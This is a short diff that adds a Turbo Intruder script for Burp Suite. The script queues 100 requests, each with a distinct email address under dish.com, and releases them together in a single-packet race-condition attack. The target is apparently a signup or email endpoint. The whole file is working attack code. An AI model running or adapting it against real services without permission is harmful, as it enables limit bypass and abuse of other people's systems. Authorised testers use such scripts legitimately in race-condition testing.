@@ -1,0 +1,19 @@
+def queueRequests(target, wordlists):
+    # Use HTTP/2 for a single-packet attack
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           engine=Engine.BURP2)
+
+    # Loop 100 times to generate 100 unique requests
+    for i in range(100):
+        # Create a unique email by appending a number to the local part.
+        # For example: something+0@dish.com, something+1@dish.com, etc.
+        unique_email = "somenewaccsd+{}@dish.com".format(i)
+        engine.queue(target.req, unique_email, gate='race1')
+
+    # Once all requests are queued, open the gate to send them simultaneously
+    engine.openGate('race1')
+
+
+def handleResponse(req, interesting):
+    table.add(req)
